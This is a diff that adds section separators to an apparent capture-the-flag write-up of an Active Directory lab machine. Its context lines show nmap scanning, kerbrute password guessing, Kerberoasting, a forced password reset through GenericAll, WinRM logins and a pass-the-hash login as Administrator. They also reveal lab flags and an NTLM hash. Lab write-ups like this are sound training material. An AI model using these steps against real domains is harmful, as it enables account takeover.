@@ -3,6 +3,8 @@
 Date: May 14–15, 2026
 Target IP: 10.112.149.251
 
+---
+
 ## About
 
 ```
@@ -20,6 +22,7 @@ Use all of the information gathered from your previous findings in order to keep
 
 *Seems like we're diving into some AD with these questions!*
 
+---
 
 ## Initial Enumeration
 
@@ -46,6 +49,7 @@ nmap -sCV -p- -Pn -oN nmap/initial 10.112.149.251
 echo "10.112.149.251 k2.thm K2Server.k2.thm" >> /etc/hosts
 ```
 
+---
 
 ## Credential Reuse from Base Camp
 
@@ -91,6 +95,7 @@ SMB         10.112.149.251  445    K2SERVER         [-] k2.thm\j.bold:Pwd@9tLNrC
 
 ![[Pasted image 20260515001241.png]]
 
+---
 
 ## WinRM as r.bud
 
@@ -134,6 +139,7 @@ At the very least adhere to the new password policy:
 - 2 characters has been added
 - Needs to be at least 1 special character and 1 number
 
+---
 
 ## Custom Wordlist → j.bold Password
 
@@ -174,6 +180,7 @@ kerbrute bruteuser --dc k2server.k2.thm -d k2.thm james_wordlist.txt j.bold
 
 **And we got a hit `#8rockyou`!**
 
+---
 
 ## Dead Ends - SMB, WinRM & Kerberoasting
 
@@ -206,6 +213,7 @@ impacket-GetUserSPNs k2.thm/j.bold:'#8rockyou' -dc-ip 10.112.149.251 -request
 
 Nothing here either. Three walls in a row, time to let BloodHound show the full picture instead.
 
+---
 
 ## BloodHound Enumeration
 
@@ -226,6 +234,7 @@ With GenericAll I can change `j.smith`'s password directly and have full control
 j.bold → [MemberOf] → IT STAFF 1 → [GenericAll] → j.smith
 ```
 
+---
 
 ## GenericAll → Force Password Reset
 
@@ -241,6 +250,7 @@ nxc winrm k2.thm -u j.smith -p 'NewPass123!'  # Pwn3d!
 He has access to both SMB and WinRM, no interesting shares tho so I will dive into WinRM.
 ![[Pasted image 20260515011240.png]]
 
+---
 
 ## WinRM as j.smith
 
@@ -248,6 +258,7 @@ On `j.smith`'s Desktop we find the user flag!
 
 **User flag:** `THM{3e5a19a9ba91881f4d7852d92126a97f}`
 
+---
 
 ## Privilege Escalation
 
@@ -295,6 +306,7 @@ evil-winrm -i k2server.k2.thm -u Administrator -H 9545b61858c043477c350ae86c37b3
 
 **Root flag:** `THM{a7e9c8149fec53865eff983143b1f5ba}`
 
+---
 
 ## Usernames on the Server (Alphabetical)
 
@@ -302,6 +314,7 @@ evil-winrm -i k2server.k2.thm -u Administrator -H 9545b61858c043477c350ae86c37b3
 j.bold, j.smith, r.bud
 ```
 
+---
 
 ## Credentials Carried Forward
 
@@ -310,3 +323,6 @@ The Administrator NTLM hash is the key artefact taken into The Summit:
 ```
 Administrator hash: 9545b61858c043477c350ae86c37b32f
 ```
+
+
+---
